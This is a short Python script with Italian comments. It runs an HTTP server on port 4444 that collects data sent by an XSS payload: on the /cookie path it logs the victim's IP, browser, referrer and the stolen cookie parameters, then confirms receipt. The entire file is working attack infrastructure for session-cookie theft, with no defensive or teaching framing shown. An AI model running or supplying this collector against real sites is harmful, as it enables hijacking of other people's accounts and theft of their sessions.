import http.server
import socketserver
import urllib.parse
from datetime import datetime

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith("/cookie"):
            # Estrai i parametri della query (dati inviati dallo script XSS)
            query_string = self.path.split("?", 1)[-1]
            params = urllib.parse.parse_qs(query_string)
            
            # Estrai IP, User-Agent, Cookie, Referrer e Data
            client_ip = self.client_address[0]
            user_agent = self.headers.get('User-Agent')
            referrer = self.headers.get('Referer')
            date = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            
            # Stampa il dump completo nel terminale
            print("\n--- DUMP RICEVUTO ---")
            print(f"IP: {client_ip}")
            print(f"Data e Ora: {date}")
            print(f"User-Agent (Versione Browser): {user_agent}")
            print(f"Referer: {referrer}")
            for key, value in params.items():
                print(f"{key}: {value}")
            
            # Risposta al client (200 OK)
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(b"Cookie e dati ricevuti con successo!")
        else:
            # Altrimenti, gestisci come una normale richiesta di file
            super().do_GET()

# Imposta il server sulla porta 4444
PORT = 4444
with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
    print(f"Server in ascolto sulla porta {PORT}...")
    httpd.serve_forever()
